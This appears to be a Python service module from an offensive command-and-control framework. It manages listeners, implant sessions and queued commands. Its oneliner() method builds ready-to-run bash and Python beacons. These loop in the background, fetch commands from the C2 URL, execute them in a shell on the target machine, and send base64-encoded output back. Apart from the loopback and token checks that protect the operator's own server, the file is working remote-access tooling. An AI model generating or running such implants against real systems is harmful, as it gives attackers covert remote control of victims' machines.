from __future__ import annotations

import ipaddress
import time

from sqlalchemy import Engine

from axiom.modules.c2.listeners import ListenerManager
from axiom.modules.c2.repository import C2Repository
from axiom.modules.c2.token import c2_listener_token
from axiom.modules.c2.schemas import (
    C2ExecCommand,
    C2Listener,
    C2Oneliner,
    C2Session,
    C2Task,
    CreateListener,
    SetSessionSleep,
)
from axiom.modules.tasks.repository import TaskRepository
from axiom.shared.clock import utcnow
from axiom.shared.database import transaction
from axiom.shared.errors import ConflictError, DomainError, NotFoundError


def _require_loopback_listener(kind: str, host: str) -> None:
    """Reject listener kinds and bind addresses that must not be exposed.

    The HTTP beacon carries a per-listener token and is meant to sit behind
    Caddy at ``/c2/``; the raw TCP socket has neither a handshake nor a token,
    so a reachable port would hand the session — and every command typed into
    it — to whoever found it first.  Callers used to be trusted to pass a
    sane host, which is how a listener ended up bound to ``0.0.0.0:443``.
    """

    if kind != "http":
        raise DomainError(
            f"只支持 http 监听器；{kind} 通道无握手无鉴权，已停用"
        )
    try:
        address = ipaddress.ip_address(host)
    except ValueError:
        raise DomainError(f"监听地址必须是回环 IP，收到 {host!r}") from None
    if not address.is_loopback:
        raise DomainError(
            f"监听地址只能是回环（127.0.0.1/::1），收到 {host}；对外由 Caddy 反代 /c2/"
        )


class C2Service:
    def __init__(self, engine: Engine):
        self.engine = engine
        self.repository = C2Repository()
        self.tasks = TaskRepository()
        self.manager = ListenerManager(engine)

    # ------------------------------------------------------------ listeners
    def list_listeners(self, task_id: str, *, include_archived: bool = False) -> list[C2Listener]:
        with self.engine.connect() as conn:
            self._require_task(conn, task_id)
            listeners = self.repository.list_listeners(conn, task_id, include_archived=include_archived)
        return [
            listener.model_copy(update={"status": self._effective_status(listener)})
            for listener in listeners
        ]

    def create_listener(self, task_id: str, body: CreateListener, *, actor: str) -> C2Listener:
        _require_loopback_listener(body.kind, body.host)
        with transaction(self.engine) as conn:
            self._require_task(conn, task_id, allow_archived=False)
            existing = self.repository.list_listeners(conn, task_id)
            for item in existing:
                if item.port == body.port and item.status == "listening":
                    raise ConflictError(f"端口 {body.port} 已被监听中的 {item.id} 占用")
            return self.repository.create_listener(
                conn,
                task_id=task_id,
                name=body.name,
                kind=body.kind,
                host=body.host,
                port=body.port,
                created_by=actor,
                now=utcnow(),
            )

    def start_listener(self, task_id: str, listener_id: str) -> C2Listener:
        with self.engine.connect() as conn:
            self._require_task(conn, task_id)
            listener = self._require_listener(conn, task_id, listener_id)
        if listener.archived:
            raise ConflictError("已归档 listener 不能启动")
        _require_loopback_listener(listener.kind, listener.host)
        self.manager.start(listener)
        return self.get_listener(task_id, listener_id)

    def stop_listener(self, task_id: str, listener_id: str) -> C2Listener:
        with self.engine.connect() as conn:
            self._require_task(conn, task_id)
            self._require_listener(conn, task_id, listener_id)
        self.manager.stop(listener_id)
        return self.get_listener(task_id, listener_id)

    def archive_listener(self, task_id: str, listener_id: str) -> None:
        self.manager.stop(listener_id)
        with transaction(self.engine) as conn:
            self._require_task(conn, task_id)
            self._require_listener(conn, task_id, listener_id)
            self.repository.update_listener(conn, task_id, listener_id, {"archived": True}, now=utcnow())

    def get_listener(self, task_id: str, listener_id: str) -> C2Listener:
        with self.engine.connect() as conn:
            self._require_task(conn, task_id)
            listener = self._require_listener(conn, task_id, listener_id)
        return listener.model_copy(update={"status": self._effective_status(listener)})

    def oneliner(self, task_id: str, listener_id: str) -> C2Oneliner:
        listener = self.get_listener(task_id, listener_id)
        host = listener.host if listener.host not in {"0.0.0.0", "::"} else "<回连地址>"
        base = f"http://{host}:{listener.port}"
        token = c2_listener_token(listener_id)
        if listener.kind == "http":
            bash = (
                f"H=$(hostname | md5sum | cut -c1-8); while :; do "
                f"C=$(curl -s -m 10 '{base}/index?sid='\"$H\"'&token={token}'); "
                f"if [ -n \"$C\" ]; then R=$(bash -c \"$C\" 2>&1 | base64 | tr -d '\\n'); "
                f"curl -s -m 10 -X POST --data-binary \"$R\" '{base}/index?sid='\"$H\"'&token={token}' >/dev/null; fi; "
                f"sleep 5; done &"
            )
            python = (
                "python3 -c \"import base64 as b,socket,subprocess as s,urllib.request as u,time;"
                "sid=socket.gethostname()[:8];"
                "exec('while True:\\n"
                f" c=u.urlopen(\\\"{base}/index?sid=\\\"+sid+\\\"&token={token}\\\",timeout=10).read().decode()\\n"
                " if c:\\n"
                "  r=b.b64encode(s.run(c,shell=True,capture_output=True).stdout).decode()\\n"
                f"  u.urlopen(u.Request(\\\"{base}/index?sid=\\\"+sid+\\\"&token={token}\\\",data=r.encode(),method=\\\"POST\\\"),timeout=10).read()\\n"
                " time.sleep(5)')\" &"
            )
            note = (
                "sleep 与 sid 可按需调整；URL 中的 token 是监听器鉴权凭据，不要泄露；"
                "base64 回传避免二进制破坏。回连地址需目标可达。"
            )
            return C2Oneliner(listener_id=listener_id, kind="http", bash=bash, python=python, note=note)
        raise DomainError(
            f"只支持 http 监听器；{listener.kind} 通道无握手无鉴权，已停用"
        )

    # ------------------------------------------------------------ sessions
    def list_sessions(self, task_id: str, *, listener_id: str | None = None) -> list[C2Session]:
        with self.engine.connect() as conn:
            self._require_task(conn, task_id)
            return self.repository.list_sessions(conn, task_id, listener_id=listener_id)

    def set_sleep(self, task_id: str, session_id: str, body: SetSessionSleep) -> C2Session:
        with transaction(self.engine) as conn:
            self._require_task(conn, task_id)
            self._require_session(conn, task_id, session_id)
            updated = self.repository.update_session(
                conn, task_id, session_id, {"sleep_seconds": body.sleep_seconds}, now=utcnow()
            )
        assert updated is not None
        return updated

    def kill_session(self, task_id: str, session_id: str) -> C2Session:
        with transaction(self.engine) as conn:
            self._require_task(conn, task_id)
            session = self._require_session(conn, task_id, session_id)
            if session.kind == "tcp":
                self.manager.exec_tcp(task_id, session_id, "exit", 2)
            updated = self.repository.update_session(conn, task_id, session_id, {"status": "dead"}, now=utcnow())
        assert updated is not None
        return updated

    # ------------------------------------------------------------ tasks
    def exec(self, task_id: str, session_id: str, body: C2ExecCommand, *, actor: str, intent_id: str | None = None) -> C2Task:
        with transaction(self.engine) as conn:
            self._require_task(conn, task_id)
            session = self._require_session(conn, task_id, session_id)
            if session.status != "active":
                raise ConflictError(f"Session {session_id} 已离线")
            task = self.repository.create_task(
                conn,
                task_id=task_id,
                session_id=session_id,
                command=body.command,
                actor=actor,
                intent_id=intent_id,
                now=utcnow(),
            )
        if session.kind == "tcp":
            started = time.monotonic()
            ok, output = self.manager.exec_tcp(task_id, session_id, body.command, max(body.wait_seconds, 5))
            duration = int((time.monotonic() - started) * 1000)
            with transaction(self.engine) as conn:
                finished = self.repository.finish_task(
                    conn, task_id, task.id, ok=ok, output=output, duration_ms=duration, now=utcnow()
                )
            assert finished is not None
            return finished
        deadline = time.monotonic() + body.wait_seconds
        while time.monotonic() < deadline:
            with self.engine.connect() as conn:
                current = self.repository.get_task(conn, task_id, task.id)
            assert current is not None
            if current.status in {"completed", "failed", "cancelled"}:
                return current
            time.sleep(0.25)
        with self.engine.connect() as conn:
            current = self.repository.get_task(conn, task_id, task.id)
        assert current is not None
        return current

    def list_tasks(self, task_id: str, *, session_id: str | None = None, limit: int = 50) -> list[C2Task]:
        with self.engine.connect() as conn:
            self._require_task(conn, task_id)
            return self.repository.list_tasks(conn, task_id, session_id=session_id, limit=limit)

    def get_task(self, task_id: str, c2_task_id: str) -> C2Task:
        with self.engine.connect() as conn:
            self._require_task(conn, task_id)
            task = self.repository.get_task(conn, task_id, c2_task_id)
        if task is None:
            raise NotFoundError(f"C2 task not found: {c2_task_id}")
        return task

    # ------------------------------------------------------------ helpers
    def _effective_status(self, listener: C2Listener) -> str:
        if listener.status == "listening" and not self.manager.is_running(listener.id):
            return "stopped"
        return listener.status

    def _require_task(self, conn, task_id: str, *, allow_archived: bool = True):
        task = self.tasks.get(conn, task_id)
        if task is None:
            raise NotFoundError(f"Task not found: {task_id}")
        if not allow_archived and task.archived:
            raise ConflictError("已归档任务不能新增 C2 资源")
        return task

    def _require_listener(self, conn, task_id: str, listener_id: str) -> C2Listener:
        listener = self.repository.get_listener(conn, task_id, listener_id)
        if listener is None:
            raise NotFoundError(f"C2 listener not found: {listener_id}")
        return listener

    def _require_session(self, conn, task_id: str, session_id: str) -> C2Session:
        session = self.repository.get_session(conn, task_id, session_id)
        if session is None:
            raise NotFoundError(f"C2 session not found: {session_id}")
        return session
